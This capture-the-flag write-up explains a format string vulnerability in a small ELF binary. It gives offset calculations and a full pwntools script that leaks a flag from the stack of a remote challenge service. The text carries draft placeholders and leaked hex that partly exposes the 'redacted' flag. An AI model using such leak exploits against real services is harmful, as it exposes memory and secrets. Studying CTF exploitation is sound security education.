## Leak Me - pwn

> ## Description
>
> tanpa format bocorkan stack. Flag ada di stack

---

> ## Initial Analysis

We're given a 64-bit ELF binary named `be3`:

```bash
be3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cd2f8d112c7598ddf7e2367423a0c8d25ec1abfd, for GNU/Linux 3.2.0, not stripped
```

> ### Protections

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

## Assembly Code

```asm
Dump of assembler code for function main:
   0x00000000004011d6 <+0>:	endbr64
   0x00000000004011da <+4>:	push   rbp
   0x00000000004011db <+5>:	mov    rbp,rsp
   0x00000000004011de <+8>:	sub    rsp,0xc0
   0x00000000004011e5 <+15>:	mov    rax,QWORD PTR [rip+0x2e6c]        # 0x404058 <stdout@GLIBC_2.2.5>
   0x00000000004011ec <+22>:	mov    ecx,0x0
   0x00000000004011f1 <+27>:	mov    edx,0x2
   0x00000000004011f6 <+32>:	mov    esi,0x0
   0x00000000004011fb <+37>:	mov    rdi,rax
   0x00000000004011fe <+40>:	call   0x4010d0 <setvbuf@plt>
   0x0000000000401203 <+45>:	lea    rax,[rbp-0x40]
   0x0000000000401207 <+49>:	mov    edx,0x30
   0x000000000040120c <+54>:	mov    esi,0x0
   0x0000000000401211 <+59>:	mov    rdi,rax
   0x0000000000401214 <+62>:	call   0x4010b0 <memset@plt>
   0x0000000000401219 <+67>:	mov    esi,0x0
   0x000000000040121e <+72>:	lea    rax,[rip+0xddf]        # 0x402004
   0x0000000000401225 <+79>:	mov    rdi,rax
   0x0000000000401228 <+82>:	mov    eax,0x0
   0x000000000040122d <+87>:	call   0x4010e0 <open@plt>
   0x0000000000401232 <+92>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401235 <+95>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x0000000000401239 <+99>:	js     0x401278 <main+162>
   0x000000000040123b <+101>:	lea    rcx,[rbp-0x40]
   0x000000000040123f <+105>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401242 <+108>:	mov    edx,0x2f
   0x0000000000401247 <+113>:	mov    rsi,rcx
   0x000000000040124a <+116>:	mov    edi,eax
   0x000000000040124c <+118>:	call   0x4010c0 <read@plt>
   0x0000000000401251 <+123>:	mov    DWORD PTR [rbp-0x8],eax
   0x0000000000401254 <+126>:	cmp    DWORD PTR [rbp-0x8],0x0
   0x0000000000401258 <+130>:	jle    0x401278 <main+162>
   0x000000000040125a <+132>:	mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040125d <+135>:	sub    eax,0x1
   0x0000000000401260 <+138>:	cdqe
   0x0000000000401262 <+140>:	movzx  eax,BYTE PTR [rbp+rax*1-0x40]
   0x0000000000401267 <+145>:	cmp    al,0xa
   0x0000000000401269 <+147>:	jne    0x401278 <main+162>
   0x000000000040126b <+149>:	mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040126e <+152>:	sub    eax,0x1
   0x0000000000401271 <+155>:	cdqe
   0x0000000000401273 <+157>:	mov    BYTE PTR [rbp+rax*1-0x40],0x0
   0x0000000000401278 <+162>:	lea    rax,[rip+0xd94]        # 0x402013
   0x000000000040127f <+169>:	mov    rdi,rax
   0x0000000000401282 <+172>:	call   0x401090 <puts@plt>
   0x0000000000401287 <+177>:	lea    rax,[rip+0xd93]        # 0x402021
   0x000000000040128e <+184>:	mov    rdi,rax
   0x0000000000401291 <+187>:	call   0x401090 <puts@plt>
   0x0000000000401296 <+192>:	lea    rax,[rbp-0xc0]
   0x000000000040129d <+199>:	mov    edx,0x7f
   0x00000000004012a2 <+204>:	mov    rsi,rax
   0x00000000004012a5 <+207>:	mov    edi,0x0
   0x00000000004012aa <+212>:	call   0x4010c0 <read@plt>
   0x00000000004012af <+217>:	lea    rax,[rbp-0xc0]
   0x00000000004012b6 <+224>:	mov    rdi,rax
   0x00000000004012b9 <+227>:	mov    eax,0x0
   0x00000000004012be <+232>:	call   0x4010a0 <printf@plt>
   0x00000000004012c3 <+237>:	lea    rax,[rip+0xd66]        # 0x402030
   0x00000000004012ca <+244>:	mov    rdi,rax
   0x00000000004012cd <+247>:	call   0x401090 <puts@plt>
   0x00000000004012d2 <+252>:	mov    eax,0x0
   0x00000000004012d7 <+257>:	leave
   0x00000000004012d8 <+258>:	ret
End of assembler dump.

```

## Vulnerability Analysis

The program reads user-controlled input into `usr_input` and passes it directly to `printf()`:

```c
read(0, &usr_input, 0x7f);
printf(&usr_input);
```

Since `usr_input` is used as the **format string**, we can control the format specifiers passed to `printf()`.

This gives us a **format string vulnerability**.

We can test this by sending:

```text
%p %p %p %p %p
```

which causes `printf()` to interpret values from the stack and other argument locations as pointers.

## Where Does The Flag Come From?

Before the format string prompt even appears, the binary already preloads something into `buf`:

```asm
lea    rax,[rbp-0x40]           ; buf
mov    edx,0x30
mov    esi,0x0
mov    rdi,rax
call   memset@plt               ; memset(buf, 0, 0x30)

lea    rax,[rip+0xddf]          ; -> 0x402004 (filename string)
mov    esi,0x0
mov    rdi,rax
call   open@plt                 ; fd = open(filename, O_RDONLY)

lea    rcx,[rbp-0x40]           ; buf
mov    edx,0x2f
mov    rsi,rcx
mov    edi,eax
call   read@plt                 ; read(fd, buf, 0x2f)
```

So before we send any input at all, the binary already: zero-initializes `buf` (`rbp-0x40`), `open()`s a hardcoded filename stored at `0x402004` (**\_\_** — fill in the filename here, e.g. `flag.txt`; check it with `x/s 0x402004` in GDB if you haven't already), then `read()`s its contents into `buf` for `0x2f` (47) bytes.

This is why `buf` is our leak target instead of arbitrary stack memory — the binary explicitly stores the flag file's content there before our format string vulnerability even triggers. The offset we calculated earlier between `usr_input` and `buf` (`0x80` bytes / 16 positional arguments) matters precisely because it tells us where on the stack the flag actually sits.

## Finding The Format String Offset

To determine where our input appears in the arguments consumed by `printf()`, we can use positional format specifiers:

```python
payload = b" ".join(
    f"%{i}$p".encode()
    for i in range(1, 20)
)
```

This produces:

```text
%1$p %2$p %3$p ... %19$p
```

The output shows that starting from `%6$p`, `printf()` begins reading data directly from our input.

For example:

```text
0x7ffe0ae8a450 0x69 0x7f800e93e4cd (nil) (nil)
0x2432252070243125
0x2520702433252070
0x7024352520702434
...
```

The value at `%6$p`:

```text
0x2432252070243125
```

corresponds to the first 8 bytes of our input:

```text
%1$p %2$
```

Therefore:

```text
%6$p → usr_input + 0x00
%7$p → usr_input + 0x08
%8$p → usr_input + 0x10
...
```

---

## Finding The Flag On The Stack

From the disassembly, the two local buffers are located at:

```asm
lea rax, [rbp-0xc0]    ; usr_input
```

and:

```asm
lea rcx, [rbp-0x40]    ; buf
```

Therefore:

```text
usr_input = rbp - 0xc0
buf       = rbp - 0x40
```

The distance between them is:

```text
0xc0 - 0x40 = 0x80 bytes
```

So:

```text
buf = usr_input + 0x80
```

We already know that `%6$p` corresponds to `usr_input + 0x00`.

Since each positional argument represents 8 bytes:

```text
0x80 / 8 = 16
```

Therefore:

```text
%6 + 16 = %22
```

So `%22$p` points to the beginning of `buf`.

The flag is 37 bytes long, which means we need five 8-byte chunks:

```text
%22$p
%23$p
%24$p
%25$p
%26$p
```

We can leak them with:

```python
payload = b" ".join(
    f"%{i}$p".encode()
    for i in range(22, 27)
)
```

The remote service returns:

```text
0x54494d494c444552
0x5f74346d7230667b
0x6c5f676e31727473
0x3474735f356b3433
0x7d6b63
```

These values represent the contents of the stack in **little-endian** order.

---

## Reconstructing The Flag

Each leaked value can be converted back into its original 8 bytes using `p64()`:

```python
values = [
    int(x, 16)
    for x in line.split()
]

flag = b"".join(
    p64(x)
    for x in values
)
```

Since the final chunk contains padding bytes after the flag, we can stop at the closing brace:

```python
flag = flag[:flag.find(b"}") + 1]
```

---

## Exploit

The final solver automates the entire process:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./be3", checksec=False)

context.binary = exe

HOST = "51.79.201.156"
PORT = 7015


def conn():
    if args.LOCAL:
        r = process([exe.path])

        if args.GDB:
            gdb.attach(
                r,
                gdbscript='''
                    b *0x4012be
                    continue
                '''
            )
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()

    r.recvuntil(b"Say something:")

    # Leak the contents of buf
    payload = b" ".join(
        f"%{i}$p".encode()
        for i in range(22, 27)
    )

    r.sendline(payload)

    output = r.recvall()

    # Find the line containing the leaked values
    line = next(
        line for line in output.splitlines()
        if b"0x" in line
    )

    # Convert leaked hex values into integers
    values = [
        int(x, 16)
        for x in line.split()
    ]

    # Reconstruct the original bytes
    flag = b"".join(
        p64(x)
        for x in values
    )

    # Remove padding after the flag
    flag = flag[:flag.find(b"}") + 1]

    print(f"flag: {flag.decode()}")


if __name__ == "__main__":
    main()
```

Running the solver gives:

<placeholder for screenshot>

## Flag

```text
REDLIMIT{redacted_challenge_still_live}
```
